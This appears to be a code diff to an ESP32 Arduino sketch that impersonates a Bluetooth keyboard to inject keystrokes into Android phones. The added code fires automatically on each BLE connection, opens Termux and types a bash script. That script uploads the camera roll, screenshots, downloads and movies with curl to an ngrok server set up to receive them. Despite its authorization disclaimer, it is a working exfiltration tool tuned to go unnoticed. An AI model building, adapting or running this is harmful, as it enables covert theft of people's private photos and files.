@@ -6,7 +6,11 @@
 // USE ONLY ON DEVICES YOU OWN OR HAVE EXPLICIT WRITTEN AUTHORIZATION TO TEST.
 //
 // WHAT THIS DOES:
-//   When GPIO 19 is pressed, the ESP32 impersonates a Bluetooth keyboard and:
+//   Mode A — AUTO (default): payload fires automatically on every new BLE
+//             connection, after a settle delay. No button press needed.
+//   Mode B — MANUAL: press GPIO 19 to fire while already connected.
+//
+//   On trigger the ESP32 impersonates a Bluetooth keyboard and:
 //     STEP 1: Navigates to Android home screen (WIN key alone)
 //     STEP 2: Opens Termux via launcher search
 //     STEP 3: Clears the shell prompt (CTRL+C, CTRL+U)
@@ -21,11 +25,12 @@
 //   - Keystroke injection: 35 ms/char — below typical human notice threshold
 //   - Heredoc delivery: full bash script injected without dropping any file
 //   - Win key alone = Home screen on all Android launchers (Win+S = screenshot)
-//   - Typing immediately after Home auto-opens the launcher search overlay
+//   - Auto-trigger: fires once per connection; cooldown prevents re-fire on
+//     momentary drops. Re-arms only after a full disconnect + reconnect.
 //
 // SERVER:
-//   fetch_photos/server/server.py  (port 8019)
-//   Run: ngrok http 8019  → paste URL in WAN_SERVER_URL below → re-flash
+//   server/server.py  (port 8019)
+//   Run: ngrok http 8019  → paste HTTPS URL in WAN_SERVER_URL below → re-flash
 //
 // TARGET DEVICE ONE-TIME SETUP (your own device):
 //   Install Termux from F-Droid → pkg install curl → termux-setup-storage
@@ -33,17 +38,36 @@
 
 #include <BleKeyboard.h>
 
+// ── Configuration ─────────────────────────────────────────────────────────────
+
 #define BUTTON_PIN     19
-#define WAN_SERVER_URL "https://xxxx-your-ngrok-url.ngrok-free.app"  // ← paste your ngrok URL here
+#define WAN_SERVER_URL "https://xxxx-your-ngrok-url.ngrok-free.app"  // ← paste ngrok URL
+
+// AUTO_TRIGGER: set to true  → payload fires automatically on BLE connection
+//               set to false → only GPIO 19 button fires the payload
+#define AUTO_TRIGGER   true
+
+// How long to wait after BLE connects before injecting keystrokes.
+// Android needs ~3 s to register the keyboard and show the home screen.
+#define CONNECT_SETTLE_MS  3500
+
+// Minimum time (ms) between two payload executions on the same connection.
+// Prevents re-fire if the BLE link momentarily stutters.
+#define COOLDOWN_MS       60000UL   // 60 seconds
+
+// ── State ─────────────────────────────────────────────────────────────────────
 
 BleKeyboard bleKeyboard("ESP32 Keyboard", "Espressif", 100);
 
-bool lastState    = HIGH;
-bool wasConnected = false;
+bool     wasConnected   = false;   // tracks previous connection state
+bool     payloadFired   = false;   // true once payload has run this session
+unsigned long connectedAt   = 0;   // millis() when BLE connected
+unsigned long lastFireMs    = 0;   // millis() when payload last ran
+bool     lastButtonState    = HIGH;
 
-// ── Helpers ──────────────────────────────────────────────────────────────────
+// ── Helpers ───────────────────────────────────────────────────────────────────
 
-void typeString(const char* str, int delayMs = 40) {
+void typeString(const char* str, int delayMs = 35) {
   for (int i = 0; i < (int)strlen(str); i++) {
     bleKeyboard.print(str[i]);
     delay(delayMs);
@@ -58,7 +82,7 @@ void pressEnter(int waitMs = 200) {
 }
 
 // WIN alone → Home screen on all Android launchers.
-// After 1200 ms the launcher has settled; typing immediately opens search.
+// WIN+S = screenshot — do NOT use that.
 void goHome(int waitMs = 1200) {
   bleKeyboard.press(KEY_LEFT_GUI);
   delay(150);
@@ -66,130 +90,155 @@ void goHome(int waitMs = 1200) {
   delay(waitMs);
 }
 
-// STEP 1 helper: WIN → Home → wait → type name → results appear → Enter → wait
-// Proven pattern from pixel7pro/blehid_pixel7pro.ino.
+// WIN → Home → type app name → Enter → wait for app to load.
 void openApp(const char* appName, int waitMs = 3000) {
-  goHome(1200);            // WIN alone → Home screen, wait 1200 ms
-  delay(300);              // let launcher fully settle
-  typeString(appName, 60); // typing auto-opens launcher search, 60 ms/char
-  delay(1000);             // wait for search results to appear
-  pressEnter(waitMs);      // Enter → open top result → wait for app to load
+  goHome(1200);
+  delay(300);
+  typeString(appName, 60);   // 60 ms/char — slow enough for search overlay
+  delay(1000);
+  pressEnter(waitMs);
 }
 
-// ── Shell line helper ──────────────────────────────────────────────────────────
-// Types one line of a shell heredoc into Termux then presses Enter.
-// Used to build the upload script line by line inside a bash heredoc.
-// 35 ms/char is reliable on all Android keyboards.
+// Type one heredoc line then press Enter.
 void typeLine(const char* line) {
   typeString(line, 35);
   pressEnter(120);
 }
 
-// ── Setup ────────────────────────────────────────────────────────────────────
+// ── Payload ───────────────────────────────────────────────────────────────────
+// Full injection sequence: open Termux → clear prompt → inject bash heredoc.
+
+void runPayload() {
+  Serial.println("[payload] Starting injection sequence...");
+
+  // ── STEP 1: Open Termux ──────────────────────────────────────────────────
+  openApp("Termux", 3000);
+  Serial.println("[payload] Step 1 done: Termux opened.");
+
+  // ── STEP 2: Clear any existing prompt input ──────────────────────────────
+  // CTRL+C kills any running foreground process (no-op if idle).
+  // CTRL+U clears the current line so the heredoc starts clean.
+  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
+  delay(100); bleKeyboard.releaseAll(); delay(400);
+
+  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
+  delay(100); bleKeyboard.releaseAll(); delay(400);
+  Serial.println("[payload] Step 2 done: prompt cleared.");
+
+  // ── STEP 3: Inject bash heredoc ─────────────────────────────────────────
+  //
+  // WHY HEREDOC:
+  //   Typing separate curl commands line-by-line causes the JSON responses
+  //   to interleave with the next line being typed, because the ESP32 does
+  //   not wait for bash to finish executing before continuing.
+  //   With a heredoc, bash buffers the entire script until UPLOAD_END, then
+  //   executes it sequentially. The ESP32 only needs to wait for typing to
+  //   finish — not for uploads to complete.
+  //
+  Serial.println("[payload] Step 3: injecting heredoc...");
+
+  typeLine("bash << 'UPLOAD_END'");
+  typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
+  typeLine("upload_dir() {");
+  typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
+  typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
+  typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
+  typeLine("  done");
+  typeLine("}");
+  typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
+  typeLine("upload_dir /sdcard/Pictures             Pictures");
+  typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
+  typeLine("upload_dir /sdcard/Download             Downloads");
+  typeLine("upload_dir /sdcard/Movies               Movies");
+  typeLine("echo '====== ALL DONE ======'");
+  typeLine("UPLOAD_END");
+
+  Serial.println("[payload] Step 3 done: heredoc typed — bash executing uploads.");
+  Serial.println("[payload] Injection complete.");
+}
+
+// ── Setup ─────────────────────────────────────────────────────────────────────
 
 void setup() {
   Serial.begin(115200);
+  delay(500);
+
   pinMode(BUTTON_PIN, INPUT_PULLUP);
+
   bleKeyboard.set_vendor_id(0x16C0);
   bleKeyboard.set_product_id(0x27DB);
   bleKeyboard.set_version(0x0100);
   bleKeyboard.begin();
-  Serial.println("PIN 19 — Android media backup trigger ready.");
-  Serial.println("Server: " WAN_SERVER_URL);
+
+  Serial.println("─────────────────────────────────────────");
+  Serial.println("  ESP32 BLE HID — Media Exfiltration Lab");
+  Serial.println("─────────────────────────────────────────");
+  Serial.print  ("  Server  : "); Serial.println(WAN_SERVER_URL);
+  Serial.print  ("  Mode    : "); Serial.println(AUTO_TRIGGER ? "AUTO (fires on BLE connect)" : "MANUAL (GPIO 19 button)");
+  Serial.print  ("  Settle  : "); Serial.print(CONNECT_SETTLE_MS); Serial.println(" ms after connect");
+  Serial.print  ("  Cooldown: "); Serial.print(COOLDOWN_MS / 1000); Serial.println(" s between fires");
+  Serial.println("  Waiting for BLE connection...");
+  Serial.println("─────────────────────────────────────────");
 }
 
-// ── Loop ─────────────────────────────────────────────────────────────────────
+// ── Loop ──────────────────────────────────────────────────────────────────────
 
 void loop() {
   bool connected = bleKeyboard.isConnected();
-  if (connected && !wasConnected)  { Serial.println("✓ Connected.");    wasConnected = true;  }
-  else if (!connected && wasConnected) { Serial.println("✗ Disconnected."); wasConnected = false; }
+  unsigned long now = millis();
 
-  if (connected) {
-    bool state = digitalRead(BUTTON_PIN);
-
-    if (lastState == HIGH && state == LOW) {
-      Serial.println("GPIO 19 fired → 3-step Termux sequence starting...");
-
-      // ── STEP 1: Go Home → type "Termux" → Enter → Termux opens ───────
-      // WIN alone goes to Home screen (NOT WIN+S which takes a screenshot).
-      // Typing immediately after Home auto-opens the launcher search overlay.
-      // The top result for "Termux" is always the Termux app.
-      // We wait 3000 ms for Termux to fully load and show a shell prompt.
-      openApp("Termux", 3000);
-      Serial.println("  Step 1 done: Termux opened.");
-
-      // ── STEP 2: Clear the Termux prompt ─────────────────────────────
-      // CTRL+C cancels any running command (safe no-op if prompt is idle).
-      // CTRL+U clears any characters already typed on the current line.
-      // Without these, previous input or a running process could eat STEP 3.
-      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('c');
-      delay(100); bleKeyboard.releaseAll(); delay(300);
-
-      bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press('u');
-      delay(100); bleKeyboard.releaseAll(); delay(300);
-      Serial.println("  Step 2 done: prompt cleared.");
-
-      // ── STEP 3: Type a bash heredoc script into Termux ───────────────
-      //
-      // WHY HEREDOC instead of separate commands:
-      //   Typing separate `find | while curl` lines one after another caused
-      //   the JSON responses from curl to interleave with the next command
-      //   being typed — because the ESP32 starts typing immediately after
-      //   pressEnter() without waiting for the shell loop to actually finish.
-      //
-      // WITH HEREDOC:
-      //   bash reads the entire script first (until UPLOAD_END), then executes
-      //   it. Every folder loop runs sequentially inside bash — no overlap,
-      //   no interleaving, no timing issue on the ESP32 side.
-      //   The ESP32 only needs to wait for the heredoc to be fully typed,
-      //   not for the uploads to complete.
-      //
-      // Script typed (each line is a typeLine() call):
-      //
-      //   bash << 'UPLOAD_END'
-      //   UP="https://...ngrok.../upload"
-      //   EXT="\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \)"
-      //   upload_dir() {
-      //     find "$1" -maxdepth 1 -type f \( ... \) | while IFS= read -r f; do
-      //       sha=$(sha256sum "$f" | cut -d' ' -f1)
-      //       curl -s -L -H "ngrok-skip-browser-warning: true" \
-      //            -F "file=@$f" -F "sha256=$sha" -F "category=$2" "$UP" \
-      //            && echo "OK: $(basename $f)" || echo "FAIL: $(basename $f)"
-      //     done
-      //   }
-      //   upload_dir /sdcard/DCIM/Camera          DCIM
-      //   upload_dir /sdcard/Pictures             Pictures
-      //   upload_dir /sdcard/Pictures/Screenshots Screenshots
-      //   upload_dir /sdcard/Download             Downloads
-      //   upload_dir /sdcard/Movies               Movies
-      //   echo '====== ALL DONE ======'
-      //   UPLOAD_END
-      //
-      Serial.println("  Step 3: typing upload script into Termux...");
-
-      typeLine("bash << 'UPLOAD_END'");
-      typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
-      typeLine("upload_dir() {");
-      typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
-      typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
-      typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
-      typeLine("  done");
-      typeLine("}");
-      typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
-      typeLine("upload_dir /sdcard/Pictures             Pictures");
-      typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
-      typeLine("upload_dir /sdcard/Download             Downloads");
-      typeLine("upload_dir /sdcard/Movies               Movies");
-      typeLine("echo '====== ALL DONE ======'");
-      typeLine("UPLOAD_END");
-
-      Serial.println("  Step 3 done: script typed — bash now running uploads.");
-
-      Serial.println("GPIO 19: all 3 steps complete.");
+  // ── Connection state change ───────────────────────────────────────────────
+  if (connected && !wasConnected) {
+    // Fresh connection
+    connectedAt  = now;
+    payloadFired = false;   // re-arm for this session
+    wasConnected = true;
+    Serial.println("[BLE] Connected — device paired.");
+    if (AUTO_TRIGGER) {
+      Serial.print("[BLE] Auto-trigger armed. Firing in ");
+      Serial.print(CONNECT_SETTLE_MS);
+      Serial.println(" ms...");
     }
-
-    lastState = state;
   }
+  else if (!connected && wasConnected) {
+    // Disconnected — reset for next connection
+    wasConnected = false;
+    Serial.println("[BLE] Disconnected. Waiting for next connection...");
+  }
+
+  // ── Auto-trigger on connect ───────────────────────────────────────────────
+  if (AUTO_TRIGGER && connected && !payloadFired) {
+    // Wait CONNECT_SETTLE_MS after connection before firing
+    if (now - connectedAt >= CONNECT_SETTLE_MS) {
+      // Also enforce cooldown (extra safety on rapid reconnects)
+      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
+        payloadFired = true;
+        lastFireMs   = now;
+        Serial.println("[AUTO] Settle delay elapsed → firing payload.");
+        runPayload();
+      }
+    }
+  }
+
+  // ── Manual trigger — GPIO 19 button ──────────────────────────────────────
+  if (connected) {
+    bool buttonState = digitalRead(BUTTON_PIN);
+
+    if (lastButtonState == HIGH && buttonState == LOW) {
+      // Debounce: enforce cooldown between manual fires too
+      if (lastFireMs == 0 || now - lastFireMs >= COOLDOWN_MS) {
+        lastFireMs = now;
+        Serial.println("[MANUAL] GPIO 19 pressed → firing payload.");
+        runPayload();
+      } else {
+        unsigned long remaining = (COOLDOWN_MS - (now - lastFireMs)) / 1000;
+        Serial.print("[MANUAL] Cooldown active — ");
+        Serial.print(remaining);
+        Serial.println(" s remaining.");
+      }
+    }
+    lastButtonState = buttonState;
+  }
+
   delay(10);
 }
